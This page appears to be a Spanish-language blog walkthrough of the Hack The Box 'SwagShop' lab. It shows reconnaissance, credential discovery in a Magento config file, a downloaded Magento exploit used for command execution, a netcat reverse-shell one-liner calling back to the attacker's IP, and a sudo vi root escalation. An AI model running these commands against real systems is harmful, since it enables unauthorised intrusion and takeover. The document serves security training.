<!-------------------------------------------------------------------------------->
<!-------------------------------------------------------------------------------->

<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/style.css?v=4e466187f8c7aec736a8844fc4931d346df15ea7">     <!-- Archivo CSS O SCSS Jekyll -->
    <!-- <link rel="stylesheet" href="/assets/css/icon-style.css"> -->                                  <!-- Archivo CSS O SCSS del Buscador -->
    <script src="https://kit.fontawesome.com/41bcea2ae3.js" crossorigin="anonymous"></script>           <!-- Archivo Java para importar fuentes -->

  <!---------------------- Configuración de Colores ------------------------------->

    <meta name="theme-color" content="#151515">
    <meta name="msapplication-navbutton-color" content="#151515">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">

  <!--------------------- Begin Jekyll SEO tag v2.8.0 ----------------------------->

   <title>F1r0x | Blog sobre Ciberseguridad.</title>
   <link rel="icon" href="/assets/images/logoweb.ico">
   <meta name="generator" content="Jekyll v3.9.2" />
   <meta property="og:title" content="F1r0x" />
   <meta property="og:locale" content="en_US" />
   <meta name="description" content="Blog sobre Ciberseguridad." />
   <meta property="og:description" content="Blog sobre Ciberseguridad." />
   <link rel="canonical" href="https://f1r0x.github.io/Web/htb_swagshop.html" />         <!-- ¡¡¡ Cambiar !!!  -->
   <meta property="og:url" content="https://f1r0x.github.io/Web/htb_swagshop.html" />    <!-- ¡¡¡ Cambiar !!!  -->
   <meta property="og:site_name" content="F1r0x" />
   <meta property="og:type" content="website" />
   <meta name="twitter:card" content="summary" />
   <meta property="twitter:title" content="F1r0x" />
   <script type="application/ld+json">
   {"@context":"https://schema.org","@type":"WebPage","description":"Blog sobre Ciberseguridad.","headline":"F1r0x","url":"https://f1r0x.github.io/portada.html"}</script>

</head>

<!--------------------------- Encabezado de la página ---------------------------------->

<header>
  <div class="container">
    <a id="a-title" href="/">
      <h5>F1r0x</h5>                                                                                                    <!-- Nombre del Autor -->                         
    </a>
    <h6>Blog sobre informática Y ciberseguridad.</h6>                                                                                 <!-- Descripción de la Página-->

<!--------------------------------- Botón Github ---------------------------------------->    
    <section id="downloads">         
      <a href="https://github.com/F1r0x/f1r0x.github.io" class="btn btn-github"><span class="icon"></span>GitHub</a>    <!-- Contenido del botón Github -->
    </section>
  </div>
</header>

<!---------------------------------  Buscador  ------------------------------------------>

<!--
<body>
<div id="a-buscador" class="buscar">
  <input type="text" class="buscar_texto" placeholder="Escrive lo que buscas">
  <a href="" class="boton">
  <i class="icon-buscar"></i>
  </a>
</div>
</body>
-->

<!----------------------------------------------------------------------------------------->
<!----------------------------------------------------------------------------------------->
<!---------------------- Contenido del Cuerpo de la Página -------------------------------->  
<!------------------------------ Botones y Efectos  --------------------------------------->
<!----------------------------------------------------------------------------------------->

<div class="container">
  
<!----------------------------- Imagen Hack The Box -------------------------------------->   

<!--
  <section id="main_content">
    <p><a href="./hackthebox.html" style="text-decoration:none">
          <img src="https://user-images.githubusercontent.com/103068924/186534363-a36084e5-2626-4b25-976c-ab2d232462f5.gif" align="middle" />
       </a>
    </p>
  </section>
-->


<!----------------------------------------------------------------------------------------->
<!----------------------------------------------------------------------------------------->
<!---------------------------- Contenido de la Página ------------------------------------->  
<!----------------------------------------------------------------------------------------->
<!----------------------------------------------------------------------------------------->

<center><img src="https://user-images.githubusercontent.com/103068924/166836563-b92de273-b0a8-44e3-9796-e0b7aa071b96.png" alt="host-1" /></center>

<h1 id="swagshop">SwagShop</h1>

<p>En primer lugar, nos creamos un directorio con el nombre de la máquina desde el que trabajaremos:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo mkdir SwagShop
</code></pre></div></div>

<p>Ahora, mediante la función <a href="../Web/Herramientas_y_Scripts/mkt.html"><code class="language-plaintext highlighter-rouge">mkt</code></a> que tengo previamente definida en la <code class="language-plaintext highlighter-rouge">.zshrc</code> crearemos nuestros directorios de trabajo:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo mkt
</code></pre></div></div>

<p>Esta función está definida para crearnos cuatro directorios (<code class="language-plaintext highlighter-rouge">nmap</code>, <code class="language-plaintext highlighter-rouge">content</code>, <code class="language-plaintext highlighter-rouge">exploits</code> y <code class="language-plaintext highlighter-rouge">scripts</code>) desde los cuales poder trabajar a la hora de
realizar las máquinas de HTB.</p>

<p><img src="https://user-images.githubusercontent.com/103068924/166874377-678da3d9-a60b-4910-ba2b-e73d5f378dd0.png" alt="Captura de pantalla -2022-05-05 08-41-27" /></p>

<h3 id="ping">PING</h3>

<p>Ejecutamos un <code class="language-plaintext highlighter-rouge">ping</code> y vemos como nos reporta un ttl=63, por tanto, ya sabemos que estamos frente una máquina Linux.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping -c 1 10.10.10.140
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/166835523-17862ac7-0b11-48f6-8675-44e7ebbcee95.png" alt="Captura de pantalla -2022-05-04 21-37-17" /></p>

<p>Ahora vamos a ver mediante <code class="language-plaintext highlighter-rouge">whatweb</code> que más podemos ver:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>whatweb 10.10.10.140
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/166848663-edca5cac-63bb-4236-b4b4-cf68c88f8ebf.png" alt="Captura de pantalla -2022-05-05 02-39-19" /></p>

<p>Vemos que es un sistema Linux Apache 2.4.18 en el cual corre un servicio <code class="language-plaintext highlighter-rouge">http</code> el cual está basado en <code class="language-plaintext highlighter-rouge">Magento</code>.</p>

<h3 id="qué-es-magento">¿Qué es Magento?</h3>

<p>Es una plataforma de comercio en línea, de código abierto (open source) y escrita en PHP, con la que puedes llevar a cabo todo tipo de proyectos relacionados con la creación de páginas web de venta en Internet.</p>

<p>Es una herramienta para el diseño y desarrollo de tu tienda online, permitiéndote una gestión avanzada de distintas áreas, incluyendo el marketing y el posicionamiento web.</p>

<h3 id="nmap">NMAP</h3>

<p>Ahora mediante <code class="language-plaintext highlighter-rouge">nmap</code> realizaremos un escaneo de puertos:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap -p- --open -sS --min-rate 5800 -vvv -n -Pn 10.10.10.140 -oG allPorts2
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/166835539-0b60bbd9-0d97-401e-bf58-95cf18c3b16b.png" alt="Captura de pantalla -2022-05-04 21-47-39" /></p>

<p>Vemos como nos reporta el puerto 80 y el puerto 20.</p>

<p><img src="https://user-images.githubusercontent.com/103068924/166835551-74619704-5005-4bfa-8a8e-ada9c5b248f1.png" alt="Captura de pantalla -2022-05-04 21-48-00" /></p>

<p>Intentamos ver el dominio <code class="language-plaintext highlighter-rouge">http://10.10.10.140/</code> y vemos como nos redirige hasta <code class="language-plaintext highlighter-rouge">swagshop.htb</code>, pero no nos permite ver la página. Para ello vamos
a registrar el dominio en nuestra carpeta <code class="language-plaintext highlighter-rouge">/etc/hosts</code> e introducimos la Ip de la máquina víctima y el host <code class="language-plaintext highlighter-rouge">swagshop.htb</code>:</p>

<p><img src="https://user-images.githubusercontent.com/103068924/166835861-a5bb2cab-8754-4ba7-a402-d8e06a4da5fe.png" alt="Captura de pantalla -2022-05-05 00-29-52" /></p>

<p><img src="https://user-images.githubusercontent.com/103068924/166835950-11b74920-c3be-4e09-9479-2852ca6de8f0.png" alt="Captura de pantalla -2022-05-05 00-31-02" /></p>

<p><img src="https://user-images.githubusercontent.com/103068924/166836019-63d932b1-f316-4008-8556-2e534a149e80.png" alt="Captura de pantalla -2022-05-04 21-51-26" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nano /etc/hosts
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/166836367-a0023b47-bba6-49ae-90b6-dc134d54563a.png" alt="Captura de pantalla -2022-05-05 00-33-07" /></p>

<p><img src="https://user-images.githubusercontent.com/103068924/166836400-df5e6f85-f7ff-4a41-8a44-1ef99793fa23.png" alt="Captura de pantalla -2022-05-05 00-34-01" /></p>

<p>Ahora volvemos a nuestro buscador y vemos como ya nos muestra la página.</p>

<p><img src="https://user-images.githubusercontent.com/103068924/166836426-d24198d0-c201-4f08-8389-160da3d98691.png" alt="Captura de pantalla -2022-05-05 00-34-40" /></p>

<p>Pasamos a revisar la página. Como podemos ver la página es bastante funcional, se trata de una página de venta de productos de HTB, contiene varios enlaces y podemos ver como nos permite comprar y tratar de registrarnos.</p>

<h3 id="gobuster">Gobuster</h3>

<p>En primer lugar, usando la herramienta <code class="language-plaintext highlighter-rouge">gobuster</code> vamos a tratar de realizar un escaneo genera en busca de alguna ruta que no se nos muestre en la página.</p>

<p>En caso de no tener la herramienta la instalamos:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install gobuster
</code></pre></div></div>

<p>Para ello especificaremos el dominio de la víctima y el diccionario de rutas que vamos a utilizar. En este caso vamos a utilizar un diccionario llamado <code class="language-plaintext highlighter-rouge">directory-list-2.3-medium.txt</code> el cual es parte del repositorio <code class="language-plaintext highlighter-rouge">seclists</code></p>

<p>Para descargar el repositorio:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo apt install seclists
</code></pre></div></div>

<p>Ya tenemos <code class="language-plaintext highlighter-rouge">gobuster</code> y el repositorio <code class="language-plaintext highlighter-rouge">seclists</code>, ahora procederemos con el escaneo:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gobuster dir -u http://10.10.10.140 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">dir</code> : Se usa para especificar la opción de directorios.</p>

<p><code class="language-plaintext highlighter-rouge">-u</code> : Se emplea para especificar una <code class="language-plaintext highlighter-rouge">url</code>.</p>

<p><code class="language-plaintext highlighter-rouge">-w</code> : Especifica el diccionario que vamos a usar.</p>

<p><img src="https://user-images.githubusercontent.com/103068924/166838244-3192932e-4622-4025-b308-a1ed407dab98.png" alt="Captura de pantalla -2022-05-05 00-52-50" /></p>

<p>Podemos ver que nos reporta una serie de directorios. Tras comprobarlos, veo que el directorio <code class="language-plaintext highlighter-rouge">app</code> contiene otros directorios.</p>

<p><img src="https://user-images.githubusercontent.com/103068924/166838568-e8ea2e18-29aa-4d63-a2fd-4c980c81cf09.png" alt="Captura de pantalla -2022-05-05 00-56-51" /></p>

<p>Esto podemos confirmarlo
volviendo a pasar el <code class="language-plaintext highlighter-rouge">gobuster</code> e incluyendo el directorio <code class="language-plaintext highlighter-rouge">app</code> en la url.</p>

<p><img src="https://user-images.githubusercontent.com/103068924/166838976-29735406-7024-4fde-a886-ffdddc691719.png" alt="Captura de pantalla -2022-05-05 01-01-17" /></p>

<p>Vamos a tratar de acceder al directorio <code class="language-plaintext highlighter-rouge">app</code> desde el navegador.</p>

<p><img src="https://user-images.githubusercontent.com/103068924/166839104-d366e1de-3b61-4e96-adc9-ecfbc824cb1e.png" alt="Captura de pantalla -2022-05-04 22-45-46" /></p>

<p>Tras ir verificando los directorios, encontramos que dentro de <code class="language-plaintext highlighter-rouge">etc/</code> en el 
archivo <code class="language-plaintext highlighter-rouge">local.xml</code> encontramos unas credenciales.</p>

<p><img src="https://user-images.githubusercontent.com/103068924/166839564-e6fa7c34-2b81-4424-9f65-56f3e87c174b.png" alt="Captura de pantalla -2022-05-05 01-04-03" /></p>

<p><img src="https://user-images.githubusercontent.com/103068924/166839569-3b55ab18-e7d0-472f-be35-799a047bfd6d.png" alt="Captura de pantalla -2022-05-05 01-04-49" /></p>

<p>Vemos como nos reporta un username como <code class="language-plaintext highlighter-rouge">root</code> y una password:</p>

<p><img src="https://user-images.githubusercontent.com/103068924/166839580-c73b2080-e56c-4ecb-936f-db53283bd1a2.png" alt="Captura de pantalla -2022-05-05 01-04-59" /></p>

<p>Guardaremos esta información en caso de que nos sea útil más tarde. Ahora vamos a tratar de generar una reverse shell. Buscando reportes de vulnerabilidades sobre Magento, encuentro en github la siguiente herramienta
escrita en python3, la cual nos permite crear una reverse shell en páginas creadas con Magento. Para ello, la herramienta nos registra automáticamente con el nombre y contraseña que le proporcionemos. Por defecto nos define
<code class="language-plaintext highlighter-rouge">str</code> tanto como usuario como contraseña.</p>

<p>Para descargar la herramienta en nuestro directorio actual:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wget https://raw.githubusercontent.com/epi052/htb-scripts-for-retired-boxes/master/swagshop/magento-oneshot.py
</code></pre></div></div>

<p>Ahora tenemos que darle permiso de ejecución:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo chmod +x magento-oneshot.py
</code></pre></div></div>

<p>Ya tenemos nuestra herramienta preparada, ahora solo debemos especificar el host de la víctima <code class="language-plaintext highlighter-rouge">http://swagshop.htb/index.php</code> y el comando que queramos ejecutar:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 magento-oneshot.py --command whoami http://swagshop.htb/index.php
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">--command</code> : Se usa para especificar un comando. En nuestro caso <code class="language-plaintext highlighter-rouge">whoami</code>.</p>

<p><img src="https://user-images.githubusercontent.com/103068924/166850027-4e6b9fee-65ad-4251-9b89-fd25e3fc4ad5.png" alt="Captura de pantalla -2022-05-05 01-40-05" /></p>

<p>Vemos como funciona perfectamente y como nos reconoce como <code class="language-plaintext highlighter-rouge">www-data</code>.</p>

<p>Desde aquí ya podríamos hacer cositas, reportando distintos comandos, podríamos 
ir interactuando con el sistema, pero no es práctico. Para poder trabajar bien
vamos a tratar de montar una shell más cómoda.</p>

<p>Para ello vamos a ver primero si disponemos de <code class="language-plaintext highlighter-rouge">netcat</code> para tratar de establecer una reverse shell:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 magento-oneshot.py --command "wich nc" http://swagshop.htb/index.php
</code></pre></div></div>

<p>Vemos que si disponemos de netcat. Ahora vamos a tratar de establecer una 
reverse shell. En el siguiente enlace, podréis ver una gran repertorio
de herramientas desde las que establecer shells inversas.</p>

<p>Nosotros vamos a utilizar la de Netcat:</p>

<p><a href="https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet">https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</a></p>

<p><img src="https://user-images.githubusercontent.com/103068924/166850489-e62e07a6-eda5-4ef7-9759-723deff77eec.png" alt="Captura de pantalla -2022-05-05 01-46-13" /></p>

<p>Primero preparamos en una terminal aparte, con nuestro comando netcat <code class="language-plaintext highlighter-rouge">nc</code> en escucha por el puerto <code class="language-plaintext highlighter-rouge">8080</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -lnvp 8080
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/166876948-fc9519f0-429a-4a41-b23f-86b89ec86d43.png" alt="Captura de pantalla -2022-05-05 09-09-31" /></p>

<p>Finalmente, especificamos el comando que nos reporta el artículo dentro de nuestro comando anterior, también especificamos nuestra Ip (En este caso es nuestra vpn de HTB) y el puerto desde el que nos pondremos en escucha, <code class="language-plaintext highlighter-rouge">8080</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 magento-oneshot.py --command "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.29 8080 &gt;/tmp/f" http://swagshop.htb/index.php
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/166876323-c111416f-50ca-4c3a-920a-9ca6ca1ccb0e.png" alt="Captura de pantalla -2022-05-05 01-47-38" /></p>

<p>Ya tenemos nuestro shell. Pero sigue sin ser funcional del todo.</p>

<p><img src="https://user-images.githubusercontent.com/103068924/166877544-d98100a1-a769-4b12-bb99-7c22b6411983.png" alt="Captura de pantalla -2022-05-05 09-11-59" /></p>

<p>Para poder obtener una shell completa basada en bash, utilizamos los siguientes comandos:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script /dev/null -c bash
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/166877565-7c129c72-ef1d-4e52-bd19-af03d44d4283.png" alt="Captura de pantalla -2022-05-05 09-12-36" /></p>

<p>Ahora pulsamos <code class="language-plaintext highlighter-rouge">Cntl + z</code> enviamos el proceso a segundo plano. Y ejecutamos lo siguiente:</p>

<p><img src="https://user-images.githubusercontent.com/103068924/166877674-46b7f844-b2ed-47b9-bfac-4c8fbfa0bc57.png" alt="Captura de pantalla -2022-05-05 09-12-53" /></p>

<p>Ejecutamos el siguiente comando:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stty raw -echo; fg
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/166877723-7f1282b0-fe27-4b73-b4a7-e4d72d07e97b.png" alt="Captura de pantalla -2022-05-05 09-13-31" /></p>

<p>Y terminamos reseteando la shell:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reset xterm
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/166877905-58e6f441-7889-4d9d-b1d4-386576924715.png" alt="Captura de pantalla -2022-05-05 09-17-59" /></p>

<p>Ahora ya tenemos una shell más estable y potente. También podemos cerrar la terminal de escucha por <code class="language-plaintext highlighter-rouge">nc</code>, ya que esta 
shell es independiente y no se nos caerá.</p>

<p>Como vemos la shell nos permite utilizar <code class="language-plaintext highlighter-rouge">Cntrl + c</code> sin expulsarnos, pero aún no nos permite utilizar <code class="language-plaintext highlighter-rouge">Cntrl + l</code> para
limpiar la shell y si utilizamos un <code class="language-plaintext highlighter-rouge">nano</code>, vemos como tampoco aprovecha todo el monitor.</p>

<p>Aunque con esta shell ya se podría realizar las tareas restantes perfectamente, voy a mostrar como solucionar estos dos pequeños inconvenientes y así tener la shell al 100% funcional.</p>

<p>Para ello primero solucionaremos el problema del <code class="language-plaintext highlighter-rouge">Cntrl + l</code> de la siguiente manera, si realizamos un <code class="language-plaintext highlighter-rouge">echo $TERM</code> vemos que tiene el valor <code class="language-plaintext highlighter-rouge">dumb</code>
y nosotros queremos que igual que nuestra shell, valga <code class="language-plaintext highlighter-rouge">xterm</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo $TERM
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/166882012-75e7c979-d17f-49da-b452-1eabf8c29dfa.png" alt="Captura de pantalla -2022-05-05 09-38-24" /></p>

<p>Vemos como nos reporta <code class="language-plaintext highlighter-rouge">dump</code>. Para cambiarlo introducimos el siguiente comando:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TERM=xterm
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/166882034-d54cce35-d4ea-4fb5-96fa-52525ab3c4d0.png" alt="Captura de pantalla -2022-05-05 09-38-46" /></p>

<p>Ahora ya podremos limpiar la pantalla mediante <code class="language-plaintext highlighter-rouge">Cntrl + l</code>. Bien, ya solo falta regular el ancho y la altura de nuestra
shell, para ello primero debemos conocer que medidas tiene nuestro monitor para poder ajustarlo, para verlo, abrimos una terminal nueva desde nuestro directorio e introducimos:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stty size
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/166882118-30d9ed4c-860c-4570-a012-cb01760ab413.png" alt="Captura de pantalla -2022-05-05 09-39-53" /></p>

<p>Copiamos los dos números. Ahora volvemos a la reverse shell y podemos ver mediante el mismo comando que las proporciones son mucho menores. Para ajustarlo realizamos lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stty size
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/166882143-f5956c0b-4082-47f9-ac74-d434ad66b244.png" alt="Captura de pantalla -2022-05-05 09-40-18" /></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stty rows 36 columns 133
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/166882227-b7499110-b554-4723-bd39-0a0f0a107bf9.png" alt="Captura de pantalla -2022-05-05 09-41-31" /></p>

<h3 id="búsqueda-de-la-primera-flag">Búsqueda de la primera Flag</h3>

<p>Una vez tengamos todo ajustado, vamos a por las flags. Para conseguir la primera, simplemente nos dirigimos al directorio raíz <code class="language-plaintext highlighter-rouge">/</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cd /
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/166882396-a0bccd4e-d044-46f1-a1bb-eede2f31b9db.png" alt="Captura de pantalla -2022-05-05 09-42-37" /></p>

<p>Y vamos a la carpeta <code class="language-plaintext highlighter-rouge">/home/haris</code> donde encontraremos el primer archivo <code class="language-plaintext highlighter-rouge">user.txt</code> con la primera flag.</p>

<p><img src="https://user-images.githubusercontent.com/103068924/166882451-e9cfb587-c226-41ee-9de7-4db5ff5fd93e.png" alt="Captura de pantalla -2022-05-05 09-43-43" /></p>

<h2 id="búsqueda-de-la-segunda-flag">Búsqueda de la segunda Flag</h2>

<h1 id="escalada-de-privilegios">Escalada de Privilegios.</h1>

<p>Ahora nos faltaría autentificarnos como <code class="language-plaintext highlighter-rouge">root</code>. Tras comprobar que no funcionan las credenciales previamente recopiladas en la base de datos mysql para conectarnos de forma
directa como <code class="language-plaintext highlighter-rouge">root</code>, así que vamos a tratar de utilizarlas para conectarnos mediante
<code class="language-plaintext highlighter-rouge">mysql</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mysql -uroot -p
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/166876538-a70e3882-fcc1-41e8-b8e4-bf7df5866ab0.png" alt="Captura de pantalla -2022-05-05 02-03-56" /></p>

<p><img src="https://user-images.githubusercontent.com/103068924/166851358-ed5dd0e2-c444-4863-b67b-14da258c33a0.png" alt="Captura de pantalla -2022-05-05 02-04-07" /></p>

<p>Genial, ahora vemos como la password conseguida anteriormente en la base de datos dentro del archivo <code class="language-plaintext highlighter-rouge">local.xml</code> nos permite conectarnos.</p>

<p>Una vez dentro de <code class="language-plaintext highlighter-rouge">mysql</code> vamos a ver las bases de datos:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>show databases;
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/166851562-c968d37b-05e9-4cb5-a7ab-30d3a4a27b0e.png" alt="Captura de pantalla -2022-05-05 02-07-44" /></p>

<p>Vemos como existe una base de datos llamada como la máquina <code class="language-plaintext highlighter-rouge">swagshop</code>. Intentemos ver sus tablas. Para ello primero ingresamos a ella mediante <code class="language-plaintext highlighter-rouge">use</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use swagshop;
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/166851750-9e57a5c0-80dd-4d4e-8c85-a2792a392f13.png" alt="Captura de pantalla -2022-05-05 02-08-13" /></p>

<p>Y ahora visualizamos las tablas:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>show tables;
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/166851761-301986d3-9d61-4d90-8e09-b37fc0f94236.png" alt="Captura de pantalla -2022-05-05 02-08-48" /></p>

<p>Vemos como se nos reportan un mentón, pero una de las más interesantes es <code class="language-plaintext highlighter-rouge">admin_user</code>. Para ver más información:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>describe admin_user;
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/166887057-ffb1ee39-564e-4bbd-bdf8-d88f8c13c034.png" alt="Captura de pantalla -2022-05-05 10-03-15" /></p>

<p>Vamos a ver que se nos reporta dentro de <code class="language-plaintext highlighter-rouge">username</code> y <code class="language-plaintext highlighter-rouge">password</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>select username,password from admin_user;
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/166887447-06cbc0df-63c9-4eaa-a2ab-2e284b11654b.png" alt="Captura de pantalla -2022-05-05 10-10-11" /></p>

<p>Vemos como nos reporta dos usuarios, <code class="language-plaintext highlighter-rouge">forme</code> que es el usuario que creamos nosotros a través del script de python3 y <code class="language-plaintext highlighter-rouge">haris</code> el cual nos indica una password hasheada. Yo he intentado descifrar el hash de varias maneras y no he conseguido extraer la contraseña.</p>

<p>Al no poder encontrar la password decidí buscar vulnerabilidades ya reportadas de nuestro sistema, que nos permita 
registrarnos como sudo.</p>

<p>Lo primero es saber si tenemos algún tipo de privilegios:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo -l
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/166888310-2fda10fb-df1d-4c45-b8f8-8706909f2843.png" alt="Captura de pantalla -2022-05-05 10-13-02" /></p>

<p>Vemos como nos permite ejecutar como <code class="language-plaintext highlighter-rouge">root</code> sin contraseña los siguientes directorios: <code class="language-plaintext highlighter-rouge">/usr/bin/vi</code> y <code class="language-plaintext highlighter-rouge">/var/www/html/*</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo /usr/bin/vi /var/www/html/*
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/166892175-c475ec08-15f0-4494-929c-99734703eb22.png" alt="Captura de pantalla -2022-05-05 10-13-50" /></p>

<p><img src="https://user-images.githubusercontent.com/103068924/166892210-554c4827-3990-4642-b2d0-9168f3bcf38c.png" alt="Captura de pantalla -2022-05-05 10-14-18" /></p>

<p>Ahora buscaremos algún binario con el que poder aprovechar estos permisos y registrarnos como<code class="language-plaintext highlighter-rouge">root</code>. Para poder buscar estas vulnerabilidades por la red
debemos conocer el sistema que estamos comprometiendo, para ello, podemos ver las especificaciones del sistema mediante el siguiente comando:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lsb_release -a
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/166892361-80f52384-3136-425d-850c-29342a72a5f9.png" alt="Captura de pantalla -2022-05-05 10-39-54" /></p>

<p>Podemos ver que nos encontramos frente ana distribución Ubuntu Xenial versión 16.04. Tras buscar un poco por internet encuentro el siguiente binario 
que nos permite aprovechar los permisos anteriores y regístranos como <code class="language-plaintext highlighter-rouge">root</code>.</p>

<p>Aquí podéis ver la página donde reportan el binario: <a href="https://gtfobins.github.io/gtfobins/vi/">https://gtfobins.github.io/gtfobins/vi/</a></p>

<p><img src="https://user-images.githubusercontent.com/103068924/166852292-ce2463a1-2c01-4e04-9ebf-1c157e38df85.png" alt="Captura de pantalla -2022-05-05 02-19-31" /></p>

<p>Para poder introducir el binario y utilizar los permisos que tenemos, debemos realizar lo siguiente:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo /usr/bin/vi /var/www/html/* -c ':!/bin/sh' /dev/null
</code></pre></div></div>

<p><img src="https://user-images.githubusercontent.com/103068924/166892568-06671371-d935-450f-90b3-92077917c43d.png" alt="Captura de pantalla -2022-05-05 10-17-27" /></p>

<p><code class="language-plaintext highlighter-rouge">sudo /usr/bin/vi /var/www/html/*</code> : Directorios donde tenemos los permisos.</p>

<p><code class="language-plaintext highlighter-rouge">-c ':!/bin/sh' /dev/null</code> : Binario para tratar de registranos como <code class="language-plaintext highlighter-rouge">root</code>.</p>

<p><img src="https://user-images.githubusercontent.com/103068924/166892617-156e59bb-4084-4bf3-a51b-899e4b15f562.png" alt="Captura de pantalla -2022-05-05 10-18-06" /></p>

<p>Genial, ya estamos como <code class="language-plaintext highlighter-rouge">root</code>. Podemos comprobarlo mediante el comando <code class="language-plaintext highlighter-rouge">whoami</code>. Finalmente, para encontrar nuestra flag, nos dirigimos al directorio <code class="language-plaintext highlighter-rouge">/root</code> donde encontramos el archivo <code class="language-plaintext highlighter-rouge">root.txt</code> con nuestra última flag.</p>

<p><img src="https://user-images.githubusercontent.com/103068924/166892662-41b701a5-2f48-4aa0-a469-613deb2e8f90.png" alt="Captura de pantalla -2022-05-05 10-18-19" /></p>

<p><img src="https://user-images.githubusercontent.com/103068924/188528617-9d7339df-0365-4335-9372-98aa513f17b0.png" alt="Captura de pantalla -2022-09-06 03-29-45" /></p>


<!----------------------------------------------------------------------------------------->
<!----------------------------------------------------------------------------------------->
<!---------------------------- Fin del contenido de la Página ----------------------------->  
<!----------------------------------------------------------------------------------------->
<!----------------------------------------------------------------------------------------->


<!----------------------------------  Menu lateral  --------------------------------------->

<body id="body">
    
<div class="icon__menu">
<i class="fas fa-bars" id="btn_open"></i>
</div>

<div class="menu__side" id="menu_side">

<!--- Botón Youtube --- 
<div class="name__page">
<i class="fab fa-youtube"></i>
<h4>F1r0x</h4>
</div>
-->

<div class="options__menu">	

<a href="../portada.html" class="selected">
<div class="option">
<i class="fas fa-home" title="Inicio"></i>
<h4>Inicio</h4>
</div>
</a>

<a href="./articulos.html">
<div class="option">
<i class="far fa-file" title="Artículos"></i>
<h4>Artículos</h4>
</div>
